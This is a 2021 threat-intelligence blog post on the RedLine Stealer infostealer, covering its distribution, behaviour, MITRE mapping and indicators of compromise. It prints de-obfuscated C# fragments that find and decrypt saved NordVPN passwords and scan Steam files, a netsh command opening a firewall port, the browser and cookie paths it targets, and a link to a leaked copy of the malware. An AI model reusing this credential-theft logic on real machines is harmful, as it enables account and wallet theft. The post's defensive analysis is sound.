---
layout: post
title: RedLine Stealer
date: 2021-12-26 22:04 +0300
categories: [Cybersecurity, Threat Intel]
tags: [threat]
---





In this report analyzing potential security threats, we have chosen to focus on the RedLine Stealer. This malware gained significant popularity in early 2020 and continues to be widely distributed as of December 2021, likely due to frequent updates. There are existing articles on this particular threat and a considerable number of IOCs, which I have included in the References section.

![](../../assets/img/threatintel/red1.png)

Overview
--

The RedLine Stealer is capable of collecting various types of sensitive information from Windows devices, such as browser credentials, cookies, system data, and browser autocomplete details, as well as cryptocurrency wallets. This malware has been distributed through a subscription-based model, classifying it as a form of Malware-as-a-Service (MaaS).

![](../../assets/img/threatintel/red2.png)

Distribution
--

The RedLine malware conceals itself under various file formats, which may include:

*   Office
*   PDF
*   RAR and ZIP
*   Executable files
*   JavaScript

The RedLine malware can be distributed through multiple channels, such as email attachments, Discord, malicious advertisements, and cracked games. Considering the current pandemic situation and the increased number of individuals working remotely, it's not uncommon to see this malware being delivered via email attachments. Additionally, the malware's capabilities may also include dropping other malicious software onto the victim's device.

Behavior
--

In 2020, a cracked version of the RedLine malware was leaked and made available in a GitHub repository (although its availability in the repository may have changed since then). Within the repository, there exists a RedLine.MainPanel.exe.config file, which serves as the configuration file for the malware's dashboard in XML format. Upon inspection, we observed the following:

*   .NETFramework v4.6.2
*   Profile Settings (Attacker’s settings): Login, Password, Server IP
*   Remote Client Settings (Victim’s settings): Passwords, Cookies, FTP, Files, CreditCards, Autofills

Furthermore, the repository also includes a batch file containing the command "netsh advfirewall firewall add rule name='RLS' dir=in action=allow protocol=TCP localport=6677." This command adds a rule to the firewall, allowing TCP connections on port 6677.

Upon examining various samples through any.run, it appears that the RedLine malware attempts to collect the victim's browser and VPN client data.

```bash
C:\Users\admin\AppData\Local\NordVPN
C:\Users\admin\AppData\Local\Chromium\User Data\
C:\Users\admin\AppData\Local\BraveSoftware\Brave-Browser\User Data\
```

In addition, the RedLine malware is known to steal cookies.

```bash
C:\Users\admin\AppData\Roaming\Mozilla\Firefox\Profiles\qldyz51w.default\cookies.sqlite
C:\Users\admin\AppData\Local\Google\Chrome\User Data\Default\Cookies
```

The behavior of this infostealer appears to be quite diverse. In certain instances, RedLine specifically targets certain programs installed on the victim's device. It's possible that the RedLine builder includes various features that can be enabled or customized to meet the needs of the malware user.

As anticipated, the RedLine malware is obfuscated, which makes it difficult to analyze. However, the Blackberry Research & Intelligence Team has been able to de-obfuscate a version of the malware, revealing several of its characteristics, including its ability to read VPN configurations.

```java
public class NordApp
{
public static List<Account> Find()
{
List<Account> list = new List<Account>();
try
{
DirectoryInfo directoryInfo = new DirectoryInfo(Path. Combine(Environment. Expand Environment Variables ("%USERPROFILE%\\AppData\\Local"
{
'NordVPN' }).Replace("Def", string. Empty)));
if (!directoryInfo. Exists)
{
return list;
}
DirectoryInfo[] directories = directoryInfo.GetDirectories (new string(new char[]
{
'NordVpn. 'x*}). Replace("Win", string. Empty));
for (int i = 0; i < directories.Length; i++)
{
foreach (DirectoryInfo directoryInfo2 in directories[i].GetDirectories())
{
try
{
string text= Path. Combine(directoryInfo2. FullName, new string(new char[]
{
'user.config' }));
if (File.Exists(text))
{
XmlDocument xmlDocument = new XmlDocument ();
xmlDocument.Load(text);
string innerText = xmlDocument.SelectSingleNode(new string(new char[]
{
'//setting[@name=\\Username\\]/value' }).Replace("String. Replace", string. Empty)). InnerText;
string innerText2 = xmlDocument.SelectSingleNode(new string(new char[]
{
'//setting[@name=\\Password\\]/value' }).Replace("String. Remove", string. Empty)). Inner Text;
if (!string.IsNullOrWhiteSpace(innerText) && !string.IsNullOrWhiteSpace(inner Text2))
{
string @dstring = Encoding.UTF8.GetString(Convert. FromBase64String(innerText));
string string2 = Encoding. UTF8.GetString(Convert. FromBase64String(inner Text2));
string text2 = CryptoHelper.DecryptBlob(@string, Data ProtectionScope. LocalMachine, null);
string text3 = CryptoHelper.DecryptBlob(string2, DataProtectionScope. LocalMachine, null);
if (!string.IsNullOrWhiteSpace(text2) && !string.IsNullOrWhiteSpace(text3))
{
list.Add(new Account
{
Username = text2,
Password = text3
});
```

Another notable aspect of the RedLine malware is its attempt to steal credentials from various instant messenger applications, such as Discord and Telegram, as well as FTP clients, such as FileZilla and WinSCP, and the Steam client.

```java
public override IEnumerable<FileScannerArg> GetScanArgs()
{
List<FileScannerArg> list = new List<FileScannerArg>();
try
{
RegistryKey registryKey = Registry. CurrentUser.OpenSubKey(new string(new char[]
{'Software\\Valve\ \Steam'}));
if (registryKey == null)
{
return list;
}
string text = registryKey.GetValue(new string(new char[]
{'SteamPath'})) as string;
if (!Directory.Exists(text))
{
return list;
}
list.Add(new FileScannerArg
{
Directory = text,
Pattern = new string(new char[]
{'*ssfn*' }),
Recoursive = false
});
list.Add(new FileScanner Arg
{
Directory = Path.Combine(text, new string(new char[]
{'config'
})),
Pattern = new string(new char[]
{'*.vstring.Replacedf'
}).Replace("string.Replace", string. Empty),
Recoursive = false
});
}
```

Conclusion and MITRE ATT&CK Matrix
--

The RedLine malware has been increasing in popularity and continues to receive updates. Recent samples of the malware appear to contain more features than the 2020 leaked version. Given the variability of the RedLine malware, individuals should exercise caution when downloading files from the internet. Unfortunately, the pandemic has made it easier for threat actors to succeed in their phishing campaigns. The cost of the malware ranges from $150 to $800, and those who purchase it are likely to see a good return on investment, particularly if they are able to access victims' cryptocurrency wallets.

![](../../assets/img/threatintel/red3.png)

IOCs
--

Hashes:
-------

*   88A8CBAC4C313547D13F5265D874776174656ED3A1BCCB9937CD47067B7FE733
*   8C7DE80EB1CB5DCD3A9B180C1EA64E2477BBD992C0BE91768C4AAF66E781ED7B
*   1E899E9715679DACD49BCC56039CA51D3DAD675C5D3525148BC94D1864304178
*   04DD197044B9D4C84A86FB2E50FC3C0C3AC5B021AA1314B821D693FA60124465
*   5975E737584DDF2601C02E5918A79DAD7531DF0E13DCA922F0525F66BEC4B448
*   CA7B364E65865734982FD56028549C652FCE04D01E5EDE83CBDE0D65AF38A853
*   13E308B3865991B142C4B3BDED2016148FDA7CF46E5D50CCD95943B0428B07A1
*   13D8CC8A5865B0D100D406358B1F38D1D9722C3B0407278480FB607CDA9C4A61
*   851F5E3FC5AAD87C89AD31AFA6702EFD6D6BC409ADAF0CE3FF0E2D683DECD495
*   662BEB6357002F6E4911A0F5CFAFD4DFF12CD22F92932AE8543429E7CF189D2C
*   BCD55CD12D6BFB1207100146D90DE34703387B88FC31C296507A368303D85797
*   9975AECF7AF009672998FE402E33CA1CBA676E24D3BA6D23E5F2E011D0A210EA
*   F64EC8BDAAC8B86E522705EA9388EB30BE070520466EF58B5141932F910A9E3E
*   747C067409C614F5F526987561ECFB860D9913432E62FDF2622C61D92E9323DB
*   A46877360915A0F6D9FF4A1CE935352E485333CA80A3C82ED83AE72BC92328C7
*   30EA2B66243B336C8C371B34D6588A3C5D08EB5EDA6334342C5164098D900A60
*   F98E925C1CCAB5E997E6E4E2349C4A31DCDFABEBBF267D1BBF7943F35F0D4B57
*   0C79CCEAF053CD034C8E6E4AE7BBC590EEB10C4A03C456C04D38AA0357F60E19
*   B23D8D32ED04AE5F2C4BE9CF88D08704C692E65756E26D5B31B87E049442D7E0
*   6958D4559B3BAE679946BC9AF076E82C41C1A71644AAB97121DDC6FBBD05E57F

IP addresses:
-------------

*   185.82.202.246 (yabynennet.xyz)
*   2.58.149.82
*   5.206.227.27
*   185.215.113.29
*   185.215.113.39
*   94.140.112.131 (jastemyaynha.xyz)
*   172.67.75.172 (api.ip.sb)
*   92.255.85.131
*   23.202.231.167
*   193.150.103.37
*   45.129.99.59
*   3.129.187.220
*   3.142.167.4
*   65.108.69.168
*   159.69.246.184
*   95.143.178.139
*   2.57.90.16
*   99.83.154.118
*   3.142.129.56
*   171.245.160.159
*   3.22.30.40
*   62.182.156.182
*   193.161.193.99
*   62.182.156.181
*   185.255.134.22
*   91.245.226.16
*   45.9.20.52
*   185.215.113.50

Domains:
--------

*   yabynennet.xyz
*   jastemyaynha.xyz
*   api.ip.sb
*   neasanckenk.site
*   bbardiergim.site
*   jangeamele.xyz
*   querahinor.xyz
*   evaexpand.com
*   fevertox.duckdns.org
*   4.tcp.ngrok.io
*   joemclean.duckdns.org
*   microsoftfixer.duckdns.org
*   fevertoxs.duckdns.org
*   adenere.duckdns.org
*   linknhomkin.com
*   hungaria-eon.eu
*   baninternetfalabellia-digita-linea.click
*   isns.net
*   krupskaya.com
*   m-onetrading-jp.com
*   majul.com
*   thuocnam.tk
*   intercourierdelivery.services
*   govvv.xyz
*   tatreriash.xyz
*   nariviqusir.xyz

References
--

*   [https://malpedia.caad.fkie.fraunhofer.de/details/win.redline\_stealer](https://malpedia.caad.fkie.fraunhofer.de/details/win.redline_stealer)
*   [https://cyberint.com/blog/research/redline-stealer/](https://cyberint.com/blog/research/redline-stealer/)
*   [https://blog.cyble.com/2021/08/12/a-deep-dive-analysis-of-redline-stealer-malware/](https://blog.cyble.com/2021/08/12/a-deep-dive-analysis-of-redline-stealer-malware/)
*   [https://socradar.io/what-is-redline-stealer-and-what-can-you-do-about-it/](https://socradar.io/what-is-redline-stealer-and-what-can-you-do-about-it/)
*   [https://any.run/malware-trends/redline](https://any.run/malware-trends/redline)
*   [https://labs.k7computing.com/index.php/redline-stealer-the-maas-info-stealer/](https://labs.k7computing.com/index.php/redline-stealer-the-maas-info-stealer/)
*   [https://threatfox.abuse.ch/browse/malware/win.redline\_stealer/](https://threatfox.abuse.ch/browse/malware/win.redline_stealer/)
*   [https://github.com/rootpencariilmu/Redlinestealer2020](https://github.com/rootpencariilmu/Redlinestealer2020)
*   [https://blog.talosintelligence.com/2021/12/magnat-campaigns-use-malvertising-to.html](https://blog.talosintelligence.com/2021/12/magnat-campaigns-use-malvertising-to.html)
*   [https://www.proofpoint.com/us/blog/threat-insight/new-redline-stealer-distributed-using-coronavirus-themed-email-campaign](https://www.proofpoint.com/us/blog/threat-insight/new-redline-stealer-distributed-using-coronavirus-themed-email-campaign)
*   [https://blogs.blackberry.com/en/2021/07/threat-thursday-redline-infostealer](https://blogs.blackberry.com/en/2021/07/threat-thursday-redline-infostealer)
